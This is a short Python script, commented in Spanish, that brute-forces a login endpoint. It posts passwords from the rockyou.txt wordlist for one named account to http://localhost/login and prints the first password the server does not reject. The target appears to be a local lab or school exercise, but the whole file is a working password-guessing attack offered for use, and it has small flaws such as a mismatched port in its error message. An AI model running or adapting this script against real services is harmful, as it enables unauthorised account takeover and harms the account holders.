import requests
import sys

# 1. Apuntar directamente a la ruta de inicio de sesión
url = "http://localhost/login"

diccionario = "/usr/share/wordlists/rockyou.txt"
usuario = "jdoe@student.42.tech"

session = requests.Session()

print("[*] Iniciando fuerza bruta rápida...")

try:
    with open(diccionario, "r", encoding="utf-8", errors="ignore") as f:
        for linea in f:
            password = linea.strip()
            
            # 2. Enviar los datos estructurados en el cuerpo de la petición
            data = {
                "identity": usuario,
                "password": password
            }

            # 3. Usar POST (puedes cambiar 'json=data' por 'data=data' si usa formulario tradicional)
            response = session.post(url, json=data)

            # 4. Monitorear el cambio en la respuesta (si no redirige a /login o da 200 OK éxito)
            if response.status_code == 200 and "Incorrect" not in response.text:
                print(f"\n[+] ¡CONTRASEÑA ENCONTRADA!: {password}")
                sys.exit(0)

except ConnectionError:
    print("\n[-] Error: El servidor objetivo está apagado o no responde en el puerto 4942.")
    sys.exit(1)
except KeyboardInterrupt:
    print("\n[-] Ataque cancelado por el usuario.")

